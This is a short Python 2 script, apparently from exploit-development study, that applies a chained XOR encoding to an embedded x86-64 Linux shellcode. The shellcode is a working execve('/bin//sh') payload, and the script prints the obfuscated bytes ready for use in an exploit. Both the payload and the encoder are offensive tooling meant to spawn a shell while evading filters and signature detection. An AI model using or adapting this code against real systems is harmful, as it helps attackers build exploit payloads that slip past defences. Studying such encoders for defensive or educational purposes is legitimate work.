#!/usr/bin/python

# python xorchain encoder
# based on class insertion encoder
# b0_enc = b0_clear ^ 0x00 (nop)
# b1_enc = b1_clear ^ b0_enc
# b2_enc = b2_clear ^ b1_enc

import random

shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")

encoded = ""
encoded2 = ""
print 'Encoded shellcode ...'

prev = 0x00;
for x in bytearray(shellcode) :
	xored = x ^ prev			
	encoded += '\\x'
	encoded += '%02x' % xored
	encoded2 += '0x'
	encoded2 += '%02x,' %xored
	prev = xored


print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
